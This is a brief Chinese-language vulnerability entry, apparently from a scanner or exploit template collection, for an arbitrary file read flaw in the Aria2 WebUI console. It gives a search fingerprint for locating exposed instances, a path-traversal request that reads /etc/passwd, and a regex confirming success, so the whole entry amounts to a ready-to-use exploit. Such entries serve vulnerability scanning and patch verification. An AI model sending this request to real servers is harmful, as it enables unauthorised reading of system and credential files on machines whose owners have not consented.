# Aria2WebUI控制台任意文件读取漏洞

Aria2WebUI ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="Aria2-WebUI"`
- **请求**：`GET /../../../../etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?bin)(?=.*?bash).*?$